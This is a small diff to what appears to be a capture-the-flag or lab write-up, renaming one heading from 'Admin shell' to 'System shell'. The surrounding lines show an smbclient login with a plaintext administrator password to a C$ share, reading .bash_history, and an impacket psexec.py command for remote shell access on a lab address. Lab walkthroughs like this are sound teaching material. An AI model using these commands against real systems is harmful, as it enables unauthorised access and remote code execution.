@@ -240,7 +240,7 @@ smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
 less .bash_history
 ```
 
-**Admin shell using psexec.py**
+**System shell using psexec.py**
 
 `python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.97`
 ```
